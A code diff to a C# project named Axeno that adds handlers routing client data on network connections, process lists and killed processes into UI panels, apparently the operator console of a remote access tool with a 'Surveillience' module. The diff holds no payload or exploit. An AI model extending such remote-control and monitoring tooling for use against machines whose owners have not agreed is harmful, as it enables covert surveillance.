@@ -13,6 +13,8 @@ using Axeno.Views.Pages.MainWindow;
 using System.Windows.Threading;
 using Axeno.Views.Pages.ClientManager;
 using Axeno.Networking.Functions.Surveillience;
+using Axeno.Networking.Functions.Networking;
+using Axeno.Networking.Functions.System;
 
 namespace Axeno.Networking.Communication
 {
@@ -81,6 +83,48 @@ namespace Axeno.Networking.Communication
 
                                 client.sendFile.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => {
                                     new HandleSendFile().HandleResult(client, msgpck);
+                                }));
+                            });
+                            break;
+                        }
+                    case "UpdateInfo":
+                        {
+                            ThreadPool.QueueUserWorkItem(delegate
+                            {
+
+                                MainWindowSlides.ClientPanel.lvclients.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => {
+                                    new HandleUpdateInfo().Update(client, msgpck);
+                                }));
+                            });
+                            break;
+                        }
+                    case "NetworkConnections":
+                        ThreadPool.QueueUserWorkItem(delegate
+                        {
+
+                            client.netCon.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => {
+                                new NetworkConnections().Handle(client, msgpck);
+                            }));
+                        });
+                        break;
+                    case "ProcessList":
+                        {
+                            ThreadPool.QueueUserWorkItem(delegate
+                            {
+
+                                client.Proc_mgr.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => {
+                                    new ProcessManager().Handle(client, msgpck);
+                                }));
+                            });
+                            break;
+                        }
+                    case "ProcessKilled":
+                        {
+                            ThreadPool.QueueUserWorkItem(delegate
+                            {
+
+                                client.Proc_mgr.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => {
+                                    new ProcessManager().HandleKilled(client, msgpck);
                                 }));
                             });
                             break;
